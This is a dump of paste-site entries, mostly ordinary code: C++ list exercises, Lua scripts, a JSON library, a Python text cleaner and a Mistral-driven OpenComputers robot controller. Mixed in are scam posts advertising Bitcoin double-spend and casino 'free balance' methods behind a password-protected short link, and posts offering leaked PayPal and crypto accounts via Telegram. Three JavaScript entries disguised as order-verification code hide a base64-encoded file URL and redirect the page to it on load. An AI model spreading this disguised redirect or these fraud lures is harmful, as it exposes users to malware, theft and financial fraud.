id,title,username,language,date,content
D7cwULYP,Другий семестр. Лабораторна робота №17 (Завдання 2),Lavig,C++,Tuesday 6th of May 2025 11:13:54 AM CDT,"#include <iostream>
#include <windows.h>
#include <list>
#include <vector>
#include <algorithm>

using namespace std;

int FindK(list<int>& lst, int k) {
    vector<int> vect(lst.begin(), lst.end());
    sort(vect.begin(), vect.end(), greater<int>());
    return vect[k - 1];
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    srand(time(0));
    list<int> numbers{};
    int N{}, i{}, temp_number{}, k{};
    while (true) {
        cout << ""Введіть бажану кількість елементів у списку (від 2 до 10): "";
        cin >> N;
        if (cin.fail() || cin.peek() != '\n' || N < 2 || N > 10) {
            cin.clear();
            cin.ignore(32767, '\n');
            cout << ""Число було введено неправильно. Спробуйте ще раз!"" << endl;
            continue;
        }
        else {
            break;
        }
    }
    cout << ""Згенерований список: "";
    for (i = 0; i < N; i++) {
        temp_number = rand() % 201 - 100;
        numbers.push_back(temp_number);
        cout << temp_number << "" "";
    }
    cout << endl;
    while (true) {
        cout << ""Введіть k: "";
        cin >> k;
        if (cin.fail() || cin.peek() != '\n' || k < 1 || k > N) {
            cin.clear();
            cin.ignore(32767, '\n');
            cout << ""Число було введено неправильно. Спробуйте ще раз!"" << endl;
            continue;
        }
        else {
            break;
        }
    }
    cout << ""k-й найбільший елемент у списку: "" << FindK(numbers, k);
}"
GJWDJqVT,Другий семестр. Лабораторна робота №17 (Завдання 1),Lavig,C++,Tuesday 6th of May 2025 11:07:29 AM CDT,"#include <iostream>
#include <windows.h>
#include <list>

using namespace std;

void SortList(list<int>& lst){
    lst.sort();
}

void PrintList(list<int>& lst) {
    for (int n : lst) {
        cout << n << "" "";
    }
    cout << endl;
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    srand(time(0));
    list<int> numbers{};
    int N{}, i{}, temp_number{};
    while (true) {
        cout << ""Введіть бажану кількість елементів у списку (від 2 до 10): "";
        cin >> N;
        if (cin.fail() || cin.peek() != '\n' || N < 2 || N > 10) {
            cin.clear();
            cin.ignore(32767, '\n');
            cout << ""Число було введено неправильно. Спробуйте ще раз!"" << endl;
            continue;
        }
        else {
            break;
        }
    }
    cout << ""Згенерований список: "";
    for (i = 0; i < N; i++) {
        temp_number = rand() % 201 - 100;
        numbers.push_back(temp_number);
        cout << temp_number << "" "";
    }
    cout << endl;
    SortList(numbers);
    cout << ""Відсортований список: "";
    PrintList(numbers);
}"
tB4D2WCp,Untitled,Darknio,Lua,Tuesday 6th of May 2025 10:56:44 AM CDT,"while true do
    os.pullEvent(""redstone"")

    if redstone.getInput(""right"") then
        redstone.setOutput(""bottom"", true)
        sleep(1)
        redstone.setOutput(""bottom"", false)

        while redstone.getInput(""right"") do
            sleep(0.5)
        end
    end
end"
14hd1Yzf,Doublespending using Vanity Wallet,luqlegal,JavaScript,Tuesday 6th of May 2025 10:06:10 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 52910
59tFdFFc,Market.js,WassupDog45,JavaScript,Tuesday 6th of May 2025 10:05:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15722/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AdVr9wdb,Crypto Accounts,navrajkhunger,JavaScript,Tuesday 6th of May 2025 10:05:37 AM CDT,01162 Accounts Posted On https://t.me/leakzbyeminem
drWijCdG,Untitled,Josif_tepe,C++,Tuesday 6th of May 2025 10:01:17 AM CDT,"#include <iostream>
#include <queue>
#include <vector>
using namespace std;

void print(int brojac) {
    if(brojac > 3) {
        return;
    }
    cout << ""HELLO WORLD"" << endl;
    print(brojac + 1);
}
int main()
{
    print(1);

    return 0;
}
//print(1)
//print(2)
//print(3)
//print(4)
"
mpggQnqp,Untitled,Josif_tepe,C++,Tuesday 6th of May 2025 09:51:49 AM CDT,"#include <iostream>
#include <queue>
#include <cstring>
#include <fstream>
#include <vector>
using namespace std;
int n, m;
char mat[1001][1001];
int si, sj;
int ei, ej;
int dist[1001][1001];
vector<pair<int, int> > guards;
const int di[] = {-1, 1, 0, 0};
const int dj[] = {0, 0, -1, 1};
bool visited[1001][1001];
struct node{
    int ii, jj, cost;
    node(){}
    node(int _ii, int _jj, int _cost){
        ii = _ii;
        jj = _jj;
        cost = _cost;
    }
    bool operator < (const node &a)const{
        return cost < a.cost;
    }
};
int main()
{
    ios_base::sync_with_stdio(false);
    cin >> n >> m;
    for(int i = 0; i < n; i ++){
        for(int j = 0; j < m; j ++){
            cin >> mat[i][j];
            if(mat[i][j] == 'R'){
                si = i;
                sj = j;
            }
            if(mat[i][j] == 'Z'){
                ei = i;
                ej = j;
            }
            if(mat[i][j] == 'G'){
                guards.push_back(make_pair(i, j));
            }
        }
    }
    queue<int> q;
    memset(dist, -1, sizeof dist);
    for(int i =0; i < guards.size(); i ++){
        q.push(guards[i].first);
        q.push(guards[i].second);
        dist[guards[i].first][guards[i].second] = 0;
    }
    memset(visited, false, sizeof visited);
    int ii, jj, ni, nj;
     
    while(!q.empty()){
        ii = q.front();
        q.pop();
        jj = q.front();
        q.pop();
        for(int k =0; k < 4; k ++){
            ni = di[k] + ii;
            nj = dj[k] + jj;
            if(ni < 0 || nj < 0 || ni >= n || nj >= m)continue;
            if(dist[ni][nj] != -1)continue;
            if(mat[ni][nj] == '*')continue;
            dist[ni][nj] = dist[ii][jj] + 1;
            q.push(ni);
            q.push(nj);
        }
    }
    priority_queue<node> pq;
    pq.push(node(si, sj, dist[si][sj]));
    visited[si][sj] = true;
    node tmp;
    while(!pq.empty()){
        tmp = pq.top();
        pq.pop();
        if(tmp.ii == ei && tmp.jj == ej){
            cout << tmp.cost << endl;
            break;
        }
        for(int k = 0; k < 4; k ++){
            ni = di[k] + tmp.ii;
            nj = dj[k] + tmp.jj;
            if(ni < 0 || nj < 0 || ni >= n || nj >= m)continue;
            if(visited[ni][nj])continue;
            if(mat[ni][nj] == '*')continue;
            visited[ni][nj] = true;
            pq.push(node(ni, nj, min(tmp.cost, dist[ni][nj])));
        }
    }
    return 0;
}
"
i1t9JCC0,Abuse RBF in BTC transactions,luqlegal,JavaScript,Tuesday 6th of May 2025 09:50:47 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 82313
ATqWmUJn,Untitled,WassupDog45,JavaScript,Tuesday 6th of May 2025 09:50:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60870/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mFZ5wktJ,PayPal with Balance,navrajkhunger,JavaScript,Tuesday 6th of May 2025 09:50:15 AM CDT,76352 Accounts Posted On https://t.me/leakzbyeminem
BfkAT1fH,robot_ai,Ewgeniy,Lua,Tuesday 6th of May 2025 09:48:17 AM CDT,"-- Автономный ИИ-Контроллер Робота для OpenComputers с логированием ошибок в файл

local component   = require(""component"")
local computer    = require(""computer"")
local internet    = require(""internet"")
local json        = require(""json"")
local tty         = require(""tty"")

-- Инициализация компонентов
local robot       = component.robot
local nav         = component.navigation
local radar       = component.isAvailable(""radar"") and component.radar or nil
local chat        = component.isAvailable(""chat"") and component.chat or nil
local camera_comp = component.isAvailable(""camera"") and component.camera or nil

-- Настройка консоли
tty.clear()
print(""=== Автономный ИИ-Контроллер Робота ==="")
io.write(""Введите API-ключ Mistral: "")
local api_key = io.read()

-- Константы API
local MISTRAL_URL   = ""https://api.mistral.ai/v1/chat/completions""
local TRANSLATE_URL = ""https://translate.googleapis.com/translate_a/single""

-- Путь для логов ошибок
local ERROR_LOG = ""/robot_errors.log""

-- Функция для записи ошибки в файл
local function log_error(err)
  local file = io.open(ERROR_LOG, ""a"")
  if file then
    file:write(os.date(""%Y-%m-%d %H:%M:%S""), "" - ERROR: "", err, ""\n"")
    file:close()
  end
end

-- Заголовки для Mistral
local headers = {
  [""Authorization""] = ""Bearer "" .. api_key,
  [""Content-Type""]  = ""application/json""
}

-- URL-энкодинг
local function urlencode(str)
  if not str then return """" end
  str = str:gsub(""\n"", ""\r\n"")
  str = str:gsub(""([^%w ])"", function(c) return string.format(""%%%02X"", string.byte(c)) end)
  return str:gsub("" "", ""+"")
end

-- Переводчик Google Translate
local function translate(text, lang)
  local url = TRANSLATE_URL .. ""?client=gtx&sl=auto&tl="" .. lang .. ""&dt=t&q="" .. urlencode(text)
  local ok, res = pcall(internet.request, url)
  if not ok or not res then return text end
  local body = """" for chunk in res do body = body .. chunk end
  local success, dec = pcall(json.decode, body)
  if not success or not dec or not dec[1] then return text end
  local out = """" for _, seg in ipairs(dec[1]) do out = out .. (seg[1] or """") end
  return out
end

-- Системное сообщение ИИ
local messages = {
  { role = ""system"", content = [[
You are an AI robot controller. Every 5 seconds respond with a JSON array of command objects for the robot to execute next.
Example:
[
  {""action"":""move"",""direction"":""forward""}
]
Always output ONLY this JSON array without any additional text.]] }
}

-- Запрос к ИИ за планом действий
local function plan_next(state)
  table.insert(messages, { role = ""user"", content = translate(json.encode(state), ""en"") })
  local payload = { model = ""mistral-large-latest"", messages = messages }
  local ok_req, resp = pcall(internet.request, MISTRAL_URL, json.encode(payload), headers)
  if not ok_req or not resp then error(""Connection error to AI API"") end
  local raw = """" for chunk in resp do raw = raw .. chunk end
  local ok_dec, dec = pcall(json.decode, raw)
  if not ok_dec or not dec or not dec.choices then error(""Invalid AI response: "" .. raw) end
  local reply = dec.choices[1].message.content
  table.insert(messages, { role = ""assistant"", content = reply })
  local ok_json, cmds = pcall(json.decode, reply)
  if not ok_json then error(""Failed parsing commands: "" .. reply) end
  return cmds
end

-- Отправка мыслей в чат
local function think_and_say(commands)
  local thought = ""Thinking to execute: "" .. json.encode(commands)
  if chat then chat.say(translate(thought, ""ru"")) end
end

-- Выполнение команд
local function execute(commands)
  for _, cmd in ipairs(commands) do
    if cmd.action == ""move"" and cmd.direction and robot[cmd.direction] then robot[cmd.direction]() end
    if cmd.action == ""turn"" then
      if cmd.direction == ""left"" then robot.turnLeft() elseif cmd.direction == ""right"" then robot.turnRight() end
    end
    if cmd.action == ""moveTo"" then nav.goTo(cmd.x or 0, cmd.y or 0, cmd.z or 0) end
    if cmd.action == ""scan"" and radar then radar.getEntities() end
    if cmd.action == ""distance"" and camera_comp then camera_comp.distance(cmd.x or 0, cmd.y or 0) end
    if cmd.action == ""distanceUp"" and camera_comp then camera_comp.distanceUp(cmd.x or 0, cmd.y or 0) end
    if cmd.action == ""distanceDown"" and camera_comp then camera_comp.distanceDown(cmd.x or 0, cmd.y or 0) end
    if cmd.action == ""shutdown"" then computer.shutdown() end
  end
end

-- Автономный цикл с обработкой ошибок
while true do
  local succ, cmds = pcall(function()
    local pos = { nav.getPosition() }
    local state = {
      energy   = computer.energy(),
      position = { x=pos[1], y=pos[2], z=pos[3] },
      facing   = nav.getFacing(),
      radar    = radar and #radar.getEntities() or 0,
      front    = camera_comp and camera_comp.distance() or nil,
      up       = camera_comp and camera_comp.distanceUp() or nil,
      down     = camera_comp and camera_comp.distanceDown() or nil
    }
    local commands = plan_next(state)
    think_and_say(commands)
    execute(commands)
  end)
  if not succ then
    log_error(cmds)
  end
  os.sleep(5)
end
"
0Pg33F0Q,Stake Free Balance Method,luqlegal,JavaScript,Tuesday 6th of May 2025 09:35:20 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 01522
aHye04n2,Products.js,navrajkhunger,JavaScript,Tuesday 6th of May 2025 09:35:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80523/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hJnZcSbB,Leaked Accounts - Fresh Hits,luqlegal,JavaScript,Tuesday 6th of May 2025 09:34:50 AM CDT,17706 Accounts Posted On https://t.me/leakzbyeminem
kj16qzrq,json (it),Ewgeniy,Lua,Tuesday 6th of May 2025 09:30:54 AM CDT,"--
-- json.lua
--
-- Copyright (c) 2018 rxi
--
-- Permission is hereby granted, free of charge, to any person obtaining a copy of
-- this software and associated documentation files (the ""Software""), to deal in
-- the Software without restriction, including without limitation the rights to
-- use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
-- of the Software, and to permit persons to whom the Software is furnished to do
-- so, subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in all
-- copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-- OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-- SOFTWARE.
--

local json = {}

-------------------------------------------------------------------------------
-- Encode
-------------------------------------------------------------------------------

local encode

local escape_char_map = {
   [ ""\\"" ] = ""\\\\"",
   [ ""\"""" ] = ""\\\"""",
   [ ""\b"" ] = ""\\b"",
   [ ""\f"" ] = ""\\f"",
   [ ""\n"" ] = ""\\n"",
   [ ""\r"" ] = ""\\r"",
   [ ""\t"" ] = ""\\t"",
}

local escape_char_map_inv = { [ ""\\/"" ] = ""/"" }
for k, v in pairs(escape_char_map) do
   escape_char_map_inv[v] = k
end

local function escape_char(c)
   return escape_char_map[c] or string.format(""\\u%04x"", c:byte())
end

local function encode_nil(val)
   return ""null""
end

local function encode_table(val, stack)
   local res = {}
   stack = stack or {}

   -- Circular reference?
   if stack[val] then error(""circular reference"") end

   stack[val] = true

   if val[1] ~= nil or next(val) == nil then
      -- Treat as array -- check keys are valid and it is not sparse
      local n = 0
      for k in pairs(val) do
         if type(k) ~= ""number"" then
            error(""invalid table: mixed or invalid key types"")
         end
         n = n + 1
      end
      if n ~= #val then
         error(""invalid table: sparse array"")
      end
      -- Encode
      for i, v in ipairs(val) do
         table.insert(res, encode(v, stack))
      end
      stack[val] = nil
      return ""["" .. table.concat(res, "","") .. ""]""

   else
      -- Treat as an object
      for k, v in pairs(val) do
         if type(k) ~= ""string"" then
            error(""invalid table: mixed or invalid key types"")
         end
         table.insert(res, encode(k, stack) .. "":"" .. encode(v, stack))
      end
      stack[val] = nil
      return ""{"" .. table.concat(res, "","") .. ""}""
   end
end


local function encode_string(val)
   return '""' .. val:gsub('[%z\1-\31\\""]', escape_char) .. '""'
end


local function encode_number(val)
   -- Check for NaN, -inf and inf
   if val ~= val or val <= -math.huge or val >= math.huge then
      error(""unexpected number value '"" .. tostring(val) .. ""'"")
   end
   return string.format(""%.14g"", val)
end


local type_func_map = {
   [ ""nil""     ] = encode_nil,
   [ ""table""   ] = encode_table,
   [ ""string""  ] = encode_string,
   [ ""number""  ] = encode_number,
   [ ""boolean"" ] = tostring,
}


encode = function(val, stack)
   local t = type(val)
   local f = type_func_map[t]
   if f then
      return f(val, stack)
   end
   error(""unexpected type '"" .. t .. ""'"")
end


function json.encode(val)
   return encode(val)
end


-------------------------------------------------------------------------------
-- Decode
-------------------------------------------------------------------------------

local parse

local function create_set(...)
   local res = {}
   for i = 1, select(""#"", ...) do
      res[ select(i, ...) ] = true
   end
   return res
end

local space_chars   = create_set("" "", ""\t"", ""\r"", ""\n"")
local delim_chars   = create_set("" "", ""\t"", ""\r"", ""\n"", ""]"", ""}"", "","")
local escape_chars  = create_set(""\\"", ""/"", '""', ""b"", ""f"", ""n"", ""r"", ""t"", ""u"")
local literals      = create_set(""true"", ""false"", ""null"")

local literal_map = {
   [ ""true""  ] = true,
   [ ""false"" ] = false,
   [ ""null""  ] = nil,
}


local function next_char(str, idx, set, negate)
   for i = idx, #str do
      if set[str:sub(i, i)] ~= negate then
         return i
      end
   end
   return #str + 1
end


local function decode_error(str, idx, msg)
   local line_count = 1
   local col_count = 1
   for i = 1, idx - 1 do
      col_count = col_count + 1
      if str:sub(i, i) == ""\n"" then
         line_count = line_count + 1
         col_count = 1
      end
   end
   error( string.format(""%s at line %d col %d"", msg, line_count, col_count) )
end


local function codepoint_to_utf8(n)
   -- http://scripts.sil.org/cms/scripts/page.php?site_id=nrsi&id=iws-appendixa
   local f = math.floor
   if n <= 0x7f then
      return string.char(n)
   elseif n <= 0x7ff then
      return string.char(f(n / 64) + 192, n % 64 + 128)
   elseif n <= 0xffff then
      return string.char(f(n / 4096) + 224, f(n % 4096 / 64) + 128, n % 64 + 128)
   elseif n <= 0x10ffff then
      return string.char(f(n / 262144) + 240, f(n % 262144 / 4096) + 128,
                                  f(n % 4096 / 64) + 128, n % 64 + 128)
   end
   error( string.format(""invalid unicode codepoint '%x'"", n) )
end


local function parse_unicode_escape(s)
   local n1 = tonumber( s:sub(3, 6),  16 )
   local n2 = tonumber( s:sub(9, 12), 16 )
   -- Surrogate pair?
   if n2 then
      return codepoint_to_utf8((n1 - 0xd800) * 0x400 + (n2 - 0xdc00) + 0x10000)
   else
      return codepoint_to_utf8(n1)
   end
end


local function parse_string(str, i)
   local has_unicode_escape = false
   local has_surrogate_escape = false
   local has_escape = false
   local last
   for j = i + 1, #str do
      local x = str:byte(j)

      if x < 32 then
         decode_error(str, j, ""control character in string"")
      end

      if last == 92 then -- ""\\"" (escape char)
         if x == 117 then -- ""u"" (unicode escape sequence)
            local hex = str:sub(j + 1, j + 5)
            if not hex:find(""%x%x%x%x"") then
               decode_error(str, j, ""invalid unicode escape in string"")
            end
            if hex:find(""^[dD][89aAbB]"") then
               has_surrogate_escape = true
            else
               has_unicode_escape = true
            end
         else
            local c = string.char(x)
            if not escape_chars[c] then
               decode_error(str, j, ""invalid escape char '"" .. c .. ""' in string"")
            end
            has_escape = true
         end
         last = nil

      elseif x == 34 then -- '""' (end of string)
         local s = str:sub(i + 1, j - 1)
         if has_surrogate_escape then
            s = s:gsub(""\\u[dD][89aAbB]..\\u...."", parse_unicode_escape)
         end
         if has_unicode_escape then
            s = s:gsub(""\\u...."", parse_unicode_escape)
         end
         if has_escape then
            s = s:gsub(""\\."", escape_char_map_inv)
         end
         return s, j + 1

      else
         last = x
      end
   end
   decode_error(str, i, ""expected closing quote for string"")
end


local function parse_number(str, i)
   local x = next_char(str, i, delim_chars)
   local s = str:sub(i, x - 1)
   local n = tonumber(s)
   if not n then
      decode_error(str, i, ""invalid number '"" .. s .. ""'"")
   end
   return n, x
end


local function parse_literal(str, i)
   local x = next_char(str, i, delim_chars)
   local word = str:sub(i, x - 1)
   if not literals[word] then
      decode_error(str, i, ""invalid literal '"" .. word .. ""'"")
   end
   return literal_map[word], x
end


local function parse_array(str, i)
   local res = {}
   local n = 1
   i = i + 1
   while 1 do
      local x
      i = next_char(str, i, space_chars, true)
      -- Empty / end of array?
      if str:sub(i, i) == ""]"" then
         i = i + 1
         break
      end
      -- Read token
      x, i = parse(str, i)
      res[n] = x
      n = n + 1
      -- Next token
      i = next_char(str, i, space_chars, true)
      local chr = str:sub(i, i)
      i = i + 1
      if chr == ""]"" then break end
      if chr ~= "","" then decode_error(str, i, ""expected ']' or ','"") end
   end
   return res, i
end


local function parse_object(str, i)
   local res = {}
   i = i + 1
   while 1 do
      local key, val
      i = next_char(str, i, space_chars, true)
      -- Empty / end of object?
      if str:sub(i, i) == ""}"" then
         i = i + 1
         break
      end
      -- Read key
      if str:sub(i, i) ~= '""' then
         decode_error(str, i, ""expected string for key"")
      end
      key, i = parse(str, i)
      -- Read ':' delimiter
      i = next_char(str, i, space_chars, true)
      if str:sub(i, i) ~= "":"" then
         decode_error(str, i, ""expected ':' after key"")
      end
      i = next_char(str, i + 1, space_chars, true)
      -- Read value
      val, i = parse(str, i)
      -- Set
      res[key] = val
      -- Next token
      i = next_char(str, i, space_chars, true)
      local chr = str:sub(i, i)
      i = i + 1
      if chr == ""}"" then break end
      if chr ~= "","" then decode_error(str, i, ""expected '}' or ','"") end
   end
   return res, i
end


local char_func_map = {
   [ '""' ] = parse_string,
   [ ""0"" ] = parse_number,
   [ ""1"" ] = parse_number,
   [ ""2"" ] = parse_number,
   [ ""3"" ] = parse_number,
   [ ""4"" ] = parse_number,
   [ ""5"" ] = parse_number,
   [ ""6"" ] = parse_number,
   [ ""7"" ] = parse_number,
   [ ""8"" ] = parse_number,
   [ ""9"" ] = parse_number,
   [ ""-"" ] = parse_number,
   [ ""t"" ] = parse_literal,
   [ ""f"" ] = parse_literal,
   [ ""n"" ] = parse_literal,
   [ ""["" ] = parse_array,
   [ ""{"" ] = parse_object,
}


parse = function(str, idx)
   local chr = str:sub(idx, idx)
   local f = char_func_map[chr]
   if f then
      return f(str, idx)
   end
   decode_error(str, idx, ""unexpected character '"" .. chr .. ""'"")
end


function json.decode(str)
   if type(str) ~= ""string"" then
      error(""expected argument of type string, got "" .. type(str))
   end
   local res, idx = parse(str, next_char(str, 1, space_chars, true))
   idx = next_char(str, idx, space_chars, true)
   if idx <= #str then
      decode_error(str, idx, ""trailing garbage"")
   end
   return res
end


return json
"
aHQrFVdf,Очистка текста от ссылок,iostream_h,Python,Tuesday 6th of May 2025 09:29:35 AM CDT,"import re

_link_pat  = re.compile(r""\s*\[[^\]]*?\]"")     # [ ... ]  со сносками/ссылками
_url_pat   = re.compile(r""https?://\S+"")        # http://… или https://…

def strip_links(text: str) -> str:
    """"""Удалить из строки вики‑сноски ([1], [citation needed]) и голые URL.""""""
    text = _link_pat.sub("""", text)
    text = _url_pat.sub("""", text)
    return "" "".join(text.split())               # нормализуем пробелы
"
